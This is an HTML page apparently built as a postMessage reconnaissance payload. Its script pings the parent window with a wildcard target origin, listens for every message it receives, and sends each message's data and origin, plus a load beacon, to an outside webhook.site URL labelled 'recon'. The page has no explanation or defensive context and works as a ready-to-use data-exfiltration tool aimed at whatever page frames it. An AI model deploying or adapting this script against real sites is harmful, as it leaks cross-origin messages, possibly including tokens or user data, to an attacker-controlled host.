<!DOCTYPE html>
<html>
<head></head>
<body>
<script>
(function() {
  var WEBHOOK = 'https://webhook.site/1017fe30-0b47-473e-98b3-3badba9b4f69/recon';

  window.addEventListener('message', function(e) {
    fetch(WEBHOOK, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({
        tipo: 'message_received',
        data: JSON.stringify(e.data),
        origin: e.origin
      })
    });
  });

  window.parent.postMessage('ping', '*');
  fetch(WEBHOOK + '?ev=load', { method: 'GET', mode: 'no-cors' });
})();
</script>
</body>
</html>
